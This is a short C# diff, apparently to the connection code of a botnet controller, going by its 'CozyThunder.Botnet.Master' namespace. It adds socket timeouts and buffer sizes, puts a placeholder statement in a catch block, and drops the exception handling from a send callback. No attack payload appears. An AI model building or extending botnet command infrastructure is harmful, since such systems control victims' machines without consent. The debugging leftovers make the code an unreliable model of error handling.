@@ -18,6 +18,10 @@ namespace CozyThunder.Botnet.Master
             peer_ = peer;
             listener_ = listener;
             socket_ = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            socket_.SendTimeout = 1000 * 10;
+            socket_.ReceiveTimeout = 1000 * 10;
+            socket_.SendBufferSize = 1024 * 4;
+            socket_.ReceiveBufferSize = 1024 * 4;
             socket_.BeginConnect(peer.EndPoint.Address, peer.EndPoint.Port, ConnectCallback, socket_);
             return true;
         }
@@ -55,17 +59,17 @@ namespace CozyThunder.Botnet.Master
                 state.workSocket = client;
                 client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, ReadCallback, state);
             }
-            catch { }
+            catch
+            {
+
+                int a = 3;
+            }
         }
 
         void SendCallback(IAsyncResult ar)
         {
-            try
-            {
-                Socket client = (Socket)ar.AsyncState;
-                int bytesSent = client.EndSend(ar);
-            }
-            catch { }
+            Socket client = (Socket)ar.AsyncState;
+            int bytesSent = client.EndSend(ar);
         }
 
         void ReadCallback(IAsyncResult ar)
